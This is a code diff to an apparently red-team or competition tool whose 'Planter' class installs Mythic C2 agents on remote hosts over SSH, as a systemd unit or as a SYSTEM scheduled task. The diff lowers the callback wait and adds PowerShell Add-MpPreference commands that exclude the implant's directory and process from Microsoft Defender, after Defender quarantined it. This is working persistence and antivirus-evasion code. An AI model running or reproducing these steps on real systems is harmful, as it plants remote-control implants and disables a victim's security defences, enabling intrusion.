@@ -95,13 +95,13 @@ class Planter:
     def plant(self, ip, box_id, os_name=None, *, transport=None, wait_sec=None):
         """Install the frozen payload for `box_id` and report both facts.
 
-        The callback window is config (`c2.callback_wait_sec`, 180s): a freshly
+        The callback window is config (`c2.callback_wait_sec`, 120s): a freshly
         installed Mythic takes MINUTES for the first agent check-in, and the old
         45s default reported "no callback" on every box of the 2026-10-18 scrim
         while all six channels were live two minutes later.
         """
         if wait_sec is None:
-            wait_sec = int((self.ctx.cfg.get("c2") or {}).get("callback_wait_sec", 180))
+            wait_sec = int((self.ctx.cfg.get("c2") or {}).get("callback_wait_sec", 120))
         os_name = os_name or self.ctx.os_of(ip)
         entry = manifest_entry(self.manifest, box_id, transport)
         if entry is None:
@@ -203,7 +203,7 @@ class Planter:
                 "unit": unit, "paths": [remote, f"/etc/systemd/system/{unit}"],
                 "check_cmd": f"systemctl is-active {unit}"}
 
-    def _install_windows(self, ip, box_id, local, transport, wait_sec=180):
+    def _install_windows(self, ip, box_id, local, transport, wait_sec=120):
         """Install the frozen payload as an ONSTART scheduled task running as SYSTEM.
 
         A Mythic console agent (apollo) is NOT a service binary: `New-Service`
@@ -223,11 +223,25 @@ class Planter:
         remote_dir = f"C:\\ProgramData\\{drawn['stem']}"
         remote = f"{remote_dir}\\{box_id}.exe"
         staged = f"C:/ProgramData/{drawn['stem']}/{box_id}.exe"
+        exclusion = ""
         try:
             self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                              f'powershell -NoProfile -Command "New-Item -ItemType '
                              f'Directory -Force -Path \'{remote_dir}\' | Out-Null"',
                              timeout=90, key_path=fh.get("key_path"))
+            # Defender quarantines a Mythic agent on sight: live dc01 removed the
+            # payload AND the task within seconds of every plant (ThreatID
+            # 2147958560, resources file+C:\Windows\System32\dc01-120.exe and
+            # service:dc01-120) while the same payload ran fine on win02. Exclude
+            # the staging directory and the binary's name first; the restore
+            # recipe puts both back.
+            exclusion = str(Path(staged).name)
+            self.ctx.ssh.ssh(
+                ip, fh["user"], fh.get("password") or "",
+                f'powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '
+                f'\'{remote_dir}\' -ErrorAction SilentlyContinue; Add-MpPreference '
+                f'-ExclusionProcess \'{exclusion}\' -ErrorAction SilentlyContinue"',
+                timeout=90, key_path=fh.get("key_path"))
             self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
                                   staged, key_path=fh.get("key_path"))
         except Exception as exc:                       # transport blowups are data
@@ -259,6 +273,7 @@ class Planter:
                            else f"task install rc={rc} status={status or '?'}: "
                                 f"{(err or out).strip()[:200]}"),
                 "unit": task, "paths": [remote, f"task:{task}"],
+                "defender": {"path": remote_dir, "process": exclusion},
                 "check_cmd": f'schtasks /Query /TN "{task}" /FO LIST'}
 
     # -- evidence -----------------------------------------------------------
